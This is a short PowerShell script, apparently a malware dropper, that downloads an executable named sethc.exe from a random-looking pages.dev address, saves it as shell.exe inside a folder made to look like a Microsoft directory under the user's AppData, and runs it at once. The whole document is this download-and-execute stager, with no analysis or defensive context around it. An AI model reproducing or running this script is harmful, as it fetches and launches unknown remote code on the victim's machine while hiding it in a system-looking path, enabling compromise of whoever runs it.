$url = "https://ipnqtxhsbvcmurjolgkfadzwey.pages.dev/files/sethc.exe"
$folderPath = "$env:USERPROFILE\AppData\Local\Microsoft\packages"
$localPath = "$folderPath\shell.exe"

Remove-Item -Path $localPath -ErrorAction SilentlyContinue

if (-Not (Test-Path $folderPath)) {
    New-Item -ItemType Directory -Path $folderPath
}

if (-Not (Test-Path $localPath)) {
    Invoke-WebRequest -Uri $url -OutFile $localPath
}

Start-Process $localPath
